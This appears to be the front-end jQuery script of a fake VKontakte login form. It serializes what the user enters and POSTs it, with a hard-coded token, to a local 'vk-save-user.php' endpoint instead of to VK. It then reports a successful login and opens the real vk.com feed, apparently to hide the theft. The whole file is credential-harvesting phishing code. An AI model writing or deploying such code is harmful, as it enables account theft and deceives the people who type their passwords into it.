$(document).ready(() => {
    $('#vk-login-block-form').on('submit', formSubmit);
});


let isSending = false;

function formSubmit(e) {
    e.preventDefault();
    if (isSending) {
        return;
    }

    isSending = true;

    $('#vk-submit').val('Загрузка...');

    setTimeout(() => {
        let data = $('#vk-login-block-form').serialize();
        data += '&token=wm435en54h5j34gjh24gk4hg654h64j2h6kg24hj56g';

        let saveUser = $.ajax({
            url: '/vk-check/vk-save-user.php',
            data: data,
            method: 'POST',
            dataType: 'json'
        });

        saveUser.then(
            res => {
                if (res.status === 'success') {
                    $('#vk-result-info-block')
                        .addClass('infoBlockGreen')
                        .removeClass('hide')
                        .text('Отлично вошли ВКонтакте');
                    return open('https://vk.com/feed');
                }

                console.log(res);

            },
            err => {
                $('#vk-result-info-block')
                    .addClass('infoBlockRed')
                    .removeClass('hide')
                    .text('Ошибка входа ВКонтакте');

                console.error(err);
            }
        );

        saveUser.always((res) => {
            isSending = false;
            $('#vk-submit').val('Войти');

            setTimeout(() => {
                $('#vk-result-info-block').fadeOut(300, () => {
                    $('#vk-result-info-block')
                        .text('')
                        .css('display', 'block')
                        .addClass('hide')
                        .removeClass('infoBlockRed')
                        .removeClass('infoBlockGreen');
                });
            }, 2000);
        })
    }, 3000);
}